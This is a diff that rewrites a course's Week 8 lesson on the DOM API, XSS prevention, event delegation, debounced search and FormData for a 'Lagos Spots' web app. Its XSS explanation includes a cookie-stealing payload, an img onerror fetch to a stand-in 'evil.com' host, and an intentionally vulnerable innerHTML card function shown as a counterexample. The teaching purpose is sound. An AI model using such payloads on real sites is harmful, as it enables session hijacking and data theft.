@@ -1,169 +1,339 @@
 # Week 8: The DOM, Events & Browser APIs
 
-So far, `renderSpots` rebuilds the entire spots list's `innerHTML` every time anything changes. That's worked, but it hides two real problems worth confronting directly: rebuilding everything is wasteful once a list grows, and stitching raw strings together with user-submitted text (like a spot's description) is a genuine security risk. This week you learn the DOM API properly, wire up real event handling with delegation, and make the "Add a Spot" form actually add a spot.
+In previous weeks, we updated the UI by overwriting `innerHTML` with template literals. While functional for quick prototypes, this approach exposes two significant vulnerabilities: **performance bottlenecks** (destroying and recreating all DOM nodes on every keystroke) and **Cross-Site Scripting (XSS)** vulnerabilities when handling user input. This week, you master the programmatic **DOM API**, **Event Propagation & Delegation**, **Debounced Search**, and modern **Browser APIs (`FormData`, `crypto.randomUUID`, `IntersectionObserver`)**.
 
 ---
 
-## Module 1: The DOM API
+## Module 1: The DOM API & Defensive Programming (XSS Prevention)
 
-### 1. Selecting & Creating Elements
+### 1. The Core Terminology of the DOM API
 
-* **Lecture & Concepts:**
-    * `document.querySelector(selector)` returns the first matching element (or `null`); `document.querySelectorAll(selector)` returns all matches as a static list.
-    * `document.createElement(tag)` builds a new, detached element in memory. `element.append(...)` adds children to it. `parent.appendChild(el)` / `parent.append(el)` attaches it to the page. Nothing appears until an element is actually attached somewhere inside `document.body`.
-    * `element.dataset` reads/writes `data-*` attributes as a plain object — `data-id="terra-kulture"` becomes `element.dataset.id`, which is exactly how you'll identify *which* spot a click happened on.
-
-* **In-Depth Example:**
-    ```ts
-    function createSpotCardElement(spot) {
-      const card = document.createElement('article');
-      card.className = 'spot-card';
-      card.dataset.id = spot.id;
-
-      const title = document.createElement('h3');
-      title.textContent = spot.name;
-
-      card.append(title);
-      return card;
-    }
-    ```
-
-* **Class Exercise: Build One Card the DOM Way**
-    1. Write `createSpotCardElement(spot)` as shown, adding elements for area, category, and description the same way (`createElement` + `textContent` + `append`).
-    2. In the console, call it with one real spot object and `document.body.append(...)` the result — confirm a real card appears.
+| Term | What It Actually Means | Technical Context |
+| :--- | :--- | :--- |
+| **Document Object Model (DOM)** | An object-oriented tree representation of the live HTML document provided by the browser. | Every node in the tree is an instance of the `Node` interface (`Element`, `Text`, `Comment`). |
+| **Node vs Element** | A `Node` is any item in the DOM tree (including whitespace text and comments); an `Element` specifically inherits from `Element` (HTML tags). | `element.childNodes` returns all Nodes; `element.children` returns only HTML Elements. |
+| **Cross-Site Scripting (XSS)** | A critical security vulnerability where an attacker injects malicious client-side script into web applications rendered to other users. | Occurs when untrusted user input is passed directly to `element.innerHTML` or `eval()`. |
+| **`textContent`** | Reads or sets the text content of a node without parsing HTML tags. | Fast and **100% immune to XSS** because HTML markup is treated as harmless literal text. |
+| **`innerHTML`** | Parses a string as HTML markup and replaces an element's entire child tree. | Re-triggers HTML tokenization and destroys existing child event listeners. |
+| **DocumentFragment** | A lightweight, minimal document object that acts as an off-screen container for DOM nodes. | Used to batch multiple node insertions into a single DOM reflow/repaint operation. |
 
 ---
 
-### 2. `textContent` vs. `innerHTML` — Why It Matters Here
-
-* **Lecture & Concepts:**
-    * `element.textContent = value` sets **plain text** — anything in `value` is displayed literally, never interpreted as HTML.
-    * `element.innerHTML = value` parses `value` **as HTML**. If `value` ever contains a real visitor's text (like a spot's description from the Add-a-Spot form) without any escaping, a malicious visitor could submit a description containing a `<script>` tag or an `onerror` attribute that runs in every other visitor's browser — this class of bug is called **XSS (Cross-Site Scripting)**, and it's a real, common vulnerability in production apps that render user content carelessly.
-    * The fix is simple: use `textContent` for anything that came from user input, and reserve `innerHTML` for markup you wrote yourself.
-
-* **In-Depth Example (The Vulnerable vs. Safe Version):**
-    ```ts
-    // Vulnerable: a description like `<img src=x onerror="alert('hacked')">` executes.
-    descriptionEl.innerHTML = spot.description;
-
-    // Safe: the same string is displayed as harmless, literal text.
-    descriptionEl.textContent = spot.description;
-    ```
-
-* **Class Exercise: Audit and Fix**
-    1. Find every place your code currently sets `innerHTML` with a spot's `name`, `area`, or `description`.
-    2. Rewrite `renderSpotCard`/`createSpotCardElement` to build each field with `createElement` + `textContent` instead of a template-literal string, for every field that could plausibly come from a real user submission.
-
----
-
-## Module 2: Events & Delegation
-
-### 1. `addEventListener` and Event Objects
-
-* **Lecture & Concepts:**
-    * `element.addEventListener('click', handler)` runs `handler` every time that element is clicked. The handler receives an **event object** carrying details — `event.target` is the exact element that was actually clicked, which may be a child of the element you attached the listener to.
-
-### 2. Event Delegation
-
-* **Lecture & Concepts:**
-    * Attaching a separate listener to every single favorite button doesn't scale — every re-render would mean re-attaching all of them, and it's easy to forget one. **Event delegation** attaches **one listener** to a stable parent element, and uses `event.target` (plus `.closest()`) to figure out which child was actually clicked.
-    * `event.target.closest(selector)` walks up from the clicked element until it finds one matching `selector` — exactly what you need to find the enclosing `.spot-card` no matter which inner element (an icon, a span) was technically clicked.
+### 2. Under the Hood: The XSS Attack Vector & Prevention
 
 ```mermaid
 sequenceDiagram
-    participant User
-    participant Button as ♥ button (inside a card)
-    participant List as #spots-list (one listener)
-    User->>Button: clicks the favorite icon
-    Button->>List: click event bubbles up to the parent
-    List->>List: event.target.closest('.spot-card')
-    List->>List: read card.dataset.id
-    List->>List: toggleFavorite(spots, id) + saveFavoriteIds
-    List-->>User: re-render marks that one card as favorited
+    autonumber
+    actor Attacker
+    actor Victim
+    participant Form as "Add Spot" Form
+    participant DOM as Vulnerable DOM (innerHTML)
+    participant HackerServer as Attacker's Endpoint
+
+    Attacker->>Form: Submits Description: `<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">`
+    Note over Form: Data saved to database or local storage
+    Victim->>DOM: Loads Lagos Spots (Card rendered via innerHTML)
+    DOM->>DOM: Browser parses &lt;img&gt; tag, fails to load "x", fires onerror
+    DOM->>HackerServer: Silently transmits victim's session cookies & tokens!
 ```
 
-* **In-Depth Example:**
-    ```ts
-    spotsList.addEventListener('click', (event) => {
-      const favoriteBtn = event.target.closest('.spot-card__favorite');
-      if (!favoriteBtn) return; // the click wasn't on a favorite button
+#### Safe DOM Construction vs Vulnerable String Insertion:
+```ts
+// 🔴 VULNERABLE TO XSS: If user enters `<script>` or `<img onerror=...>` in description
+function renderCardUnsafe(spot: Spot): string {
+  return `
+    <article class="spot-card">
+      <h3>${spot.name}</h3>
+      <p>${spot.description}</p>
+    </article>
+  `;
+}
 
-      const card = favoriteBtn.closest('.spot-card');
-      const id = card.dataset.id;
+// 🟢 SAFE: Programmatic DOM Construction
+function createSpotCardElement(spot: Spot): HTMLElement {
+  const article = document.createElement('article');
+  article.className = 'spot-card';
+  article.dataset.id = spot.id;
 
-      spots = toggleFavorite(spots, id);
-      saveFavoriteIds(spots.filter((s) => s.favorited).map((s) => s.id));
-      renderSpots(spots);
-    });
-    ```
+  const header = document.createElement('div');
+  header.className = 'spot-card__header';
 
-* **Class Exercise: Delegate the Favorite Click**
-    1. Add a `<button class="spot-card__favorite">♥</button>` inside each rendered card.
-    2. Attach **one** click listener on `#spots-list`, exactly as shown, instead of one per card.
-    3. Confirm clicking any card's favorite button toggles and persists correctly, and that newly rendered cards work without re-attaching anything.
+  const title = document.createElement('h3');
+  title.className = 'spot-card__title';
+  title.textContent = spot.name; // Immune to XSS injection
 
----
+  const badge = document.createElement('span');
+  badge.className = 'spot-card__badge';
+  badge.textContent = spot.category;
 
-### 3. Real Form Submission
+  header.append(title, badge);
 
-* **Lecture & Concepts:**
-    * A `<form>`'s default behavior on submit is to reload the page and send the data to a server — not what you want yet. `event.preventDefault()` inside a `submit` listener stops that.
-    * `new FormData(form)` reads every named field's current value in one step, which you can then convert into a plain object with `Object.fromEntries(formData)`.
+  const desc = document.createElement('p');
+  desc.className = 'spot-card__description';
+  desc.textContent = spot.description; // Harmless literal text
 
-* **In-Depth Example:**
-    ```ts
-    submitSpotForm.addEventListener('submit', (event) => {
-      event.preventDefault();
+  const favBtn = document.createElement('button');
+  favBtn.className = 'spot-card__favorite';
+  favBtn.type = 'button';
+  favBtn.setAttribute('aria-label', `Favorite ${spot.name}`);
+  favBtn.textContent = '❤️';
 
-      const formData = new FormData(submitSpotForm);
-      const newSpot = {
-        id: crypto.randomUUID(),
-        ...Object.fromEntries(formData),
-        favorited: false,
-      };
-
-      spots = [...spots, newSpot];
-      renderSpots(spots);
-      submitSpotForm.reset();
-    });
-    ```
-    * `crypto.randomUUID()` is a built-in browser API that generates a real, unique id — no library needed.
-
-* **Class Exercise: Wire Up the Real Form**
-    1. Implement the submit handler above on `submit.html`'s form.
-    2. Submit a real new spot and confirm it appears immediately (this page won't share state with `index.html` yet — that's expected until a real backend exists in Part IV).
-    3. Add basic inline error display: if `formData.get('description').length < 10`, show a message instead of adding the spot (reuse the `minlength` validation concept from Week 2, now enforced in JS too).
+  article.append(header, desc, favBtn);
+  return article;
+}
+```
 
 ---
 
-## Module 3: Browser Storage Recap & a Bonus Web API
+## Module 2: Event Propagation, Delegation & Debouncing
 
-### 1. `localStorage` vs. `sessionStorage`
+### 1. Under the Hood: The 3 Phases of Event Propagation
 
-* **Lecture & Concepts:**
-    * `localStorage` persists until explicitly cleared — survives closing the browser entirely. `sessionStorage` clears when the tab closes. Favorites belong in `localStorage`; something like "which filter tab was last open in this tab" is a reasonable `sessionStorage` candidate.
+When a user clicks a button deep inside a card, the browser does **not** simply execute that button's listener in isolation. Events travel in a 3-phase cycle:
 
-### 2. `IntersectionObserver` (Optional)
+```mermaid
+flowchart TD
+    Window["1. window"] --> Document["2. document"]
+    Document --> Body["3. &lt;body&gt;"]
+    Body --> Container["4. &lt;section id='spots-list'&gt;"]
+    Container --> Card["5. &lt;article class='spot-card'&gt;"]
+    Card --> Button["6. &lt;button class='spot-card__favorite'&gt; (Target)"]
 
-* **Lecture & Concepts:**
-    * `IntersectionObserver` lets you run code when an element scrolls into view — the standard way to build "load more as you scroll" or lazy-load images, without a manual `scroll` event listener (which fires constantly and is expensive to compute against).
+    subgraph Capturing["Phase 1: Capturing Phase (Trickles down from window)"]
+        Window -.-> Document -.-> Body -.-> Container -.-> Card
+    end
 
-* **Class Exercise (Bonus): Lazy-Load Card Images**
-    1. Set each card's `<img>` `src` from a `data-src` attribute instead of `src` directly.
-    2. Use an `IntersectionObserver` to set the real `src` only once the card scrolls near the viewport.
+    subgraph Target["Phase 2: Target Phase"]
+        Button
+    end
+
+    subgraph Bubbling["Phase 3: Bubbling Phase (Bubbles up from target to window)"]
+        Button --> Card --> Container --> Body --> Document --> Window
+    end
+```
+
+1. **Capturing Phase:** The event travels down from `window` through ancestors to the target element.
+2. **Target Phase:** The event reaches the actual element clicked (`event.target`).
+3. **Bubbling Phase (Default for `addEventListener`):** The event bubbles back up from the target to `window`. **Event Delegation relies entirely on bubbling.**
+
+---
+
+### 2. Event Delegation: Performance & Dynamic Elements
+
+Instead of attaching 500 event listeners to 500 individual cards (which consumes memory and breaks when new cards are dynamically added), **Event Delegation** attaches **one single listener** to the parent container:
+
+```mermaid
+graph TD
+    Parent["<b>#spots-list</b><br/>(One Single Event Listener)"]
+    Card1["Card 1: Favorite Btn"]
+    Card2["Card 2: Favorite Btn"]
+    CardN["Card 500: Favorite Btn (Dynamically Added)"]
+
+    Card1 -->|"Bubbles Click Event"| Parent
+    Card2 -->|"Bubbles Click Event"| Parent
+    CardN -->|"Bubbles Click Event"| Parent
+```
+
+```ts
+// src/main.ts
+const spotsContainer = document.getElementById('spots-list');
+
+spotsContainer?.addEventListener('click', (event: MouseEvent) => {
+  const target = event.target as HTMLElement;
+
+  // 1. Identify if a favorite button (or icon inside it) was clicked
+  const favoriteBtn = target.closest<HTMLButtonElement>('.spot-card__favorite');
+  if (favoriteBtn) {
+    event.stopPropagation(); // Prevent card navigation click
+    const card = favoriteBtn.closest<HTMLElement>('.spot-card');
+    const spotId = card?.dataset.id;
+    if (spotId) {
+      handleToggleFavorite(spotId);
+    }
+    return;
+  }
+
+  // 2. Identify if the spot card itself was clicked (e.g., to open details)
+  const spotCard = target.closest<HTMLElement>('.spot-card');
+  if (spotCard) {
+    const spotId = spotCard.dataset.id;
+    console.log(`Open spot details modal for ID: ${spotId}`);
+  }
+});
+```
+
+- **`event.target`:** The exact, deepest element clicked (e.g., the `<span>` inside the button).
+- **`event.currentTarget`:** The element holding the event listener (`#spots-list`).
+- **`element.closest(selector)`:** Traverses upward through ancestors until it finds a matching selector.
+
+---
+
+### 3. Under the Hood: Debouncing Frequent Input Events
+
+When a user types into a search input, the `input` event fires on **every single keystroke**. Filtering an array or querying an API on every letter causes unnecessary CPU churn.
+
+**Debouncing** guarantees that a function will only execute after a specified delay has elapsed since the *last time* it was invoked:
+
+```mermaid
+sequenceDiagram
+    autonumber
+    actor User
+    participant Input as Search Input
+    participant Debounce as Debounce Wrapper (300ms)
+    participant Search as executeSearch()
+
+    User->>Input: Types "T"
+    Input->>Debounce: Schedule call in 300ms (Timer #1)
+    User->>Input: Types "e" (at 100ms)
+    Input->>Debounce: Clear Timer #1, Schedule Timer #2 in 300ms
+    User->>Input: Types "r" (at 200ms)
+    Input->>Debounce: Clear Timer #2, Schedule Timer #3 in 300ms
+    Note over Debounce: User stops typing (300ms elapses)
+    Debounce->>Search: Execute search with "Ter" (1 single execution!)
+```
+
+#### Generic Debounce Implementation in TypeScript:
+```ts
+export function debounce<T extends (...args: any[]) => void>(
+  func: T,
+  delayMs: number
+): (...args: Parameters<T>) => void {
+  let timeoutId: ReturnType<typeof setTimeout> | undefined;
+
+  return function (...args: Parameters<T>) {
+    if (timeoutId) {
+      clearTimeout(timeoutId); // Reset countdown timer
+    }
+    timeoutId = setTimeout(() => {
+      func(...args);
+    }, delayMs);
+  };
+}
+
+// Usage in Lagos Spots Search:
+const searchInput = document.querySelector<HTMLInputElement>('#search-input');
+
+function handleSearch(event: Event) {
+  const query = (event.target as HTMLInputElement).value.trim().toLowerCase();
+  const matched = spots.filter(
+    (s) => s.name.toLowerCase().includes(query) || s.area.toLowerCase().includes(query)
+  );
+  renderSpots(matched);
+}
+
+searchInput?.addEventListener('input', debounce(handleSearch, 300));
+```
+
+---
+
+## Module 3: Form Handling with the `FormData` API
+
+### 1. Intercepting Form Submissions
+
+```ts
+const addSpotForm = document.querySelector<HTMLFormElement>('#add-spot-form');
+
+addSpotForm?.addEventListener('submit', (event: SubmitEvent) => {
+  event.preventDefault(); // Prevents full page reload
+
+  // 1. Instant extraction of all named fields
+  const formData = new FormData(addSpotForm);
+  
+  const name = formData.get('spotName') as string;
+  const category = formData.get('category') as Spot['category'];
+  const area = formData.get('area') as string;
+  const description = formData.get('description') as string;
+
+  // 2. Client-side validation logic
+  if (!name || name.trim().length < 3) {
+    showFormError('Spot name must be at least 3 characters long.');
+    return;
+  }
+  if (!description || description.trim().length < 15) {
+    showFormError('Description must be at least 15 characters long.');
+    return;
+  }
+
+  // 3. Assemble new Spot entity with cryptographic UUID
+  const newSpot: Spot = {
+    id: crypto.randomUUID(), // Native browser UUID generator
+    name: name.trim(),
+    category,
+    area: area.trim(),
+    description: description.trim(),
+    imageUrl: '/assets/placeholder-spot.jpg',
+  };
+
+  // 4. Update in-memory state & re-render
+  spots = [newSpot, ...spots];
+  renderSpots(spots);
+  
+  // 5. Reset form inputs
+  addSpotForm.reset();
+  showFormSuccess('Spot submitted successfully!');
+});
+```
+
+---
+
+## Module 4: High-Performance Browser APIs: `IntersectionObserver`
+
+Instead of attaching an expensive `window.addEventListener('scroll', ...)` listener that fires 60+ times per second, modern web apps use **`IntersectionObserver`** to detect when elements enter the viewport asynchronously:
+
+```ts
+// Lazy-load card images as they scroll into view
+const imageObserver = new IntersectionObserver(
+  (entries, observer) => {
+    entries.forEach((entry) => {
+      if (entry.isIntersecting) {
+        const img = entry.target as HTMLImageElement;
+        const realSrc = img.dataset.src;
+        if (realSrc) {
+          img.src = realSrc;
+          img.classList.remove('opacity-0');
+          img.classList.add('opacity-100');
+        }
+        observer.unobserve(img); // Cease observing once loaded
+      }
+    });
+  },
+  {
+    rootMargin: '100px', // Pre-fetch image 100px before it enters screen
+    threshold: 0.1,
+  }
+);
+```
+
+---
+
+### Common Pitfalls & How to Avoid Them
+
+| Pitfall | Cause | Fix |
+| :--- | :--- | :--- |
+| **XSS via `innerHTML`** | Concatenating unsanitized user strings into HTML templates. | Use `document.createElement()` and `textContent` for any user-provided string. |
+| **Default page reload on form submit** | Missing `event.preventDefault()`. | Call `event.preventDefault()` as the very first line inside the `submit` event listener. |
+| **Unbounded scroll/input handler execution** | Firing computationally expensive rendering on every single keystroke/pixel scrolled. | Wrap handler with a 300ms `debounce()` or use `IntersectionObserver`. |
+| **Event target misidentification** | Clicking a child `<span>` or `<i>` inside a button causes `event.target` to refer to the span, not the button. | Always use `event.target.closest('button')` to find the enclosing button element. |
 
 ---
 
 ### Week 8: Comprehensive Assignment
 
-**Objective:** A fully interactive, safely rendered Lagos Spots: real DOM construction, delegated events, and a working submit form.
+**Objective:** Modernize Lagos Spots' user interaction layer: eliminate XSS vulnerabilities with safe DOM creation, implement event delegation for favorites, debounce real-time search queries, and handle form creation via `FormData`.
 
 **Requirements:**
-
-1. **Safe Rendering:** No user-controllable field (`name`, `area`, `description`) is ever inserted via `innerHTML` — all built with `createElement`/`textContent`.
-2. **Delegation:** Exactly one click listener on `#spots-list` handles every card's favorite button, using `event.target.closest()`.
-3. **Form Handling:** The "Add a Spot" form uses `event.preventDefault()`, `FormData`, and adds a real new spot object to the in-memory array, re-rendering immediately.
-4. **Validation:** At least one real validation rule enforced in JS (not just the HTML attribute), with a visible error message on failure.
-5. **Git:** Committed and pushed via the branch → PR → merge workflow.
-
-**Bonus Challenge:** Implement the `IntersectionObserver` lazy-loading exercise above, and explain in a one-line comment why it's more efficient than a `scroll` event listener.
+1. **Defensive DOM Rendering:**
+   - Spot cards constructed programmatically using `document.createElement`, `classList`, and `textContent`.
+   - Zero raw `innerHTML` string injection of user-supplied properties (`name`, `description`, `area`).
+2. **Event Delegation Architecture:**
+   - Single delegated `click` event listener on `#spots-list` handling all card favorite toggles via `event.target.closest('.spot-card__favorite')`.
+3. **Debounced Real-Time Search:**
+   - Search bar input in `#search` that filters spots in real time.
+   - Keystroke events debounced by $300\text{ms}$ to prevent unnecessary render cycles.
+4. **Form Handling with `FormData` & `crypto.randomUUID()`:**
+   - "Add a Spot" form handled via `submit` event with `event.preventDefault()`.
+   - Data parsed via `new FormData(form)`.
+   - Validation checks for minimum name length ($\ge 3$) and description ($\ge 15$).
+   - Valid submissions assigned a unique ID via `crypto.randomUUID()`, appended to state, rendered immediately, and form reset.
+5. **Git Workflow:**
+   - Developed on branch `feature/dom-events-delegation`, merged via Pull Request, and pulled locally.
